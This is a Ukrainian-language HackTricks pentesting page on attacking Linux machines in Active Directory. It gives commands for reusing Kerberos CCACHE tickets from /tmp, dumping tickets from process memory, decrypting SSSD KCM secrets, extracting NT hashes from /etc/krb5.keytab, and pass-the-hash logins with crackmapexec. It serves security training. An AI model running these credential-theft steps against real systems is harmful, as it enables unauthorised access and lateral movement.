# Лінукс Active Directory

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Ви працюєте в **кібербезпеці компанії**? Хочете побачити, як ваша **компанія рекламується на HackTricks**? або ви хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Дізнайтеся про [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* Отримайте [**офіційний PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи телеграм**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Лінуксова машина також може бути присутня в середовищі Active Directory.

Лінуксова машина в AD може **зберігати різні квитки CCACHE у файлах. Ці квитки можуть бути використані та зловживані, як будь-який інший квиток Kerberos**. Для читання цих квитків вам потрібно бути власником користувача квитка або **root** всередині машини.

## Перелік

### Перелік AD з лінукса

Якщо у вас є доступ до AD в лінуксі (або bash в Windows), ви можете спробувати [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) для переліку AD.

Ви також можете перевірити наступну сторінку, щоб дізнатися **інші способи переліку AD з лінукса**:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA - це відкрите **альтернативне** до Microsoft Windows **Active Directory**, головним чином для **Unix** середовищ. Воно поєднує повний **LDAP-каталог** з MIT **Kerberos** Центром розподілу ключів для управління, подібного до Active Directory. Використовуючи Dogtag **Certificate System** для управління сертифікатами CA та RA, воно підтримує **багатофакторну** аутентифікацію, включаючи смарт-карти. SSSD інтегрований для процесів аутентифікації Unix. Дізнайтеся більше про це в:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Гра з квитками

### Передача квитка

На цій сторінці ви знайдете різні місця, де ви можете **знайти квитки Kerberos всередині хоста лінукса**, на наступній сторінці ви можете дізнатися, як перетворити ці формати квитків CCache на Kirbi (формат, який вам потрібно використовувати в Windows), а також як виконати атаку PTT:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### Повторне використання квитка CCACHE з /tmp

Файли CCACHE - це бінарні формати для **зберігання облікових даних Kerberos**, які зазвичай зберігаються з дозволами 600 в `/tmp`. Ці файли можна ідентифікувати за їх **форматом імені, `krb5cc_%{uid}`,** що відповідає UID користувача. Для перевірки квитка аутентифікації **змінна середовища `KRB5CCNAME`** повинна бути встановлена на шлях до потрібного файлу квитка, що дозволяє його повторне використання.

Перелічте поточний квиток, використаний для аутентифікації за допомогою `env | grep KRB5CCNAME`. Формат є портативним, і квиток можна **повторно використовувати, встановивши змінну середовища** за допомогою `export KRB5CCNAME=/tmp/ticket.ccache`. Формат імені квитка Kerberos - `krb5cc_%{uid}`, де uid - це UID користувача.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### Повторне використання квитків CCACHE з keyring

**Квитки Kerberos, збережені в пам'яті процесу, можуть бути видобуті**, особливо коли захист ptrace машини відключений (`/proc/sys/kernel/yama/ptrace_scope`). Корисний інструмент для цієї мети знаходиться за посиланням [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), який спрощує видобуток шляхом впровадження в сесії та виведення квитків в `/tmp`.

Для налаштування та використання цього інструменту слід виконати наступні кроки:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
### Використання квитків CCACHE з SSSD KCM

SSSD зберігає копію бази даних за шляхом `/var/lib/sss/secrets/secrets.ldb`. Відповідний ключ зберігається як прихований файл за шляхом `/var/lib/sss/secrets/.secrets.mkey`. За замовчуванням ключ доступний лише для читання, якщо у вас є **root** права.

Викликання \*\*`SSSDKCMExtractor` \*\* з параметрами --database та --key розбере базу даних та **розшифрує секрети**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**Кеш облікових даних Kerberos можна перетворити в файл Kerberos CCache**, який можна передати до Mimikatz/Rubeus.

### Повторне використання квитків CCACHE з keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Витягнення облікових записів з /etc/krb5.keytab

Ключі облікових записів служб, які є важливими для служб, що працюють з привілеями root, безпечно зберігаються в файлах **`/etc/krb5.keytab`**. Ці ключі, схожі на паролі для служб, вимагають строгої конфіденційності.

Для перевірки вмісту файлу keytab можна використовувати **`klist`**. Цей інструмент призначений для відображення деталей ключа, включаючи **NT Hash** для аутентифікації користувача, особливо коли тип ключа визначено як 23.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Для користувачів Linux **`KeyTabExtract`** пропонує функціонал для вилучення хешу RC4 HMAC, який можна використовувати для повторного використання хешу NTLM.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
На macOS, **`bifrost`** служить як інструмент для аналізу файлу keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Використовуючи отриману інформацію про обліковий запис та хеш, можна встановлювати з'єднання з серверами за допомогою інструментів, таких як **`crackmapexec`**.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Посилання
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Ви працюєте в **кібербезпецівій компанії**? Хочете побачити, як ваша **компанія рекламується на HackTricks**? або ви хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у форматі PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або групи [**telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
